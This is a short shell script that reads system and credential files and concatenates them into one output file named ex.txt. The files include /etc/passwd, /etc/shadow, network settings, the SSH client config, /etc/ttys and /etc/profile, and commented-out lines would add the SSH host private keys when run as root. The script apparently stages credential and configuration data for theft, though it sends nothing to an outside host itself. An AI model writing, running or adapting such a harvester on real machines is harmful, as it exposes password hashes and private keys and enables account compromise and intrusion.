#!/bin/sh

echo "passwd:\n" > ex.txt
cat /etc/passwd >> ex.txt
echo "shadow:\n" >> ex.txt
cat /etc/shadow >> ex.txt
echo "networks:\n" >> ex.txt
cat /etc/networks >> ex.txt
echo "netsettings:\n" >> ex.txt
cat /etc/netconfig >> ex.txt
echo "ssh:\n" >> ex.txt
#these are commented out because root is needed to run them
#echo "host key ecdsa:\n" >> ex.txt
#cat /etc/ssh/ssh_host_ecdsa_key >> ex.txt
#echo "host key ed25519:\n" >> ex.txt
#cat /etc/ssh/ssh_host_ed25519_key >> ex.txt
#echo "host key RSA:\n" >> ex.txt
#cat /etc/ssh/ssh_host_rsa_key >> ex.txt
echo "ssh config:\n" >> ex.txt
cat /etc/ssh/ssh_config >> ex.txt
echo "user:\n" >> ex.txt
cat /etc/ttys >> ex.txt
echo "profile:\n" >> ex.txt
cat /etc/profile >> ex.txt
